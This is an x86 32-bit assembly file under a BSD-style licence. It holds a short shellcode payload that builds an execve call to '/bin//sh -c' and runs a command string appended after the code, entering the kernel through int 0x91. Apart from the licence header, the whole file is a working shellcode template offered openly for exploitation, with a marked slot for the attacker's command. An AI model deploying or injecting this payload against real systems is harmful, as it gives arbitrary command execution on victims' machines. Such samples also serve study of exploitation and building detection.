;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
    bits    32
    
    push    0x3b
    pop     eax         ; eax = sys_execve
    cdq                 ; edx = 0
    push    edx         ; '\0'
    push    '//sh'    	; "hs//"
    push    '/bin'    	; "nib/"
    mov     ebx, esp    ; ebx = "/bin//sh", 0
    push    edx         ; '\0'
    push    word '-c'
    mov     edi, esp
    push    edx         ; NULL
    jmp     l_cmd
r_cmd:
    push    edi         ; "-c", 0    
    push    ebx         ; "/bin//sh", 0
    mov     ecx, esp    ; ecx = argv
    push    edx         ; 0
    push    edx         ; 0
    push    ecx         ; argv 
    push    ebx         ; "/bin//sh", 0
    push    edx         ; 
    int     0x91
l_cmd: 
    call    r_cmd    
    ; put your command here followed by null terminator
    
    
    
    